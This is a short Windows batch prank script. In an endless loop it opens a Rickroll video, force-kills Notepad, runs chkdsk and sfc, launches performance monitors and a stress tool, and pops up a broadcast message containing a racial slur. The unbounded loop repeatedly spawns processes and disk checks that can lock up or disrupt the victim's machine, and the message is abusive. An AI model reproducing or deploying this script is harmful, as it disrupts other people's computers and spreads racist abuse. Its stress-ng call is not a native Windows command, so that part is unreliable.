@echo off
:StartLoop
start "" "Rickroll.mp4"
powercfg -s SCHEME_MAX
systeminfo
tasklist
taskkill /F /IM notepad.exe
sfc /scannow
chkdsk C: /f /r
ipconfig /all
ping 8.8.8.8
tracert google.com
netstat -ano
perfmon
stress-ng 
perfmon /report
systeminfo
ping 1.1.1.1
msg * "bich ass nigga hahahahahahahah"
echo commands executed, repeating mwahahahahahaha bitch
goto StartLoop
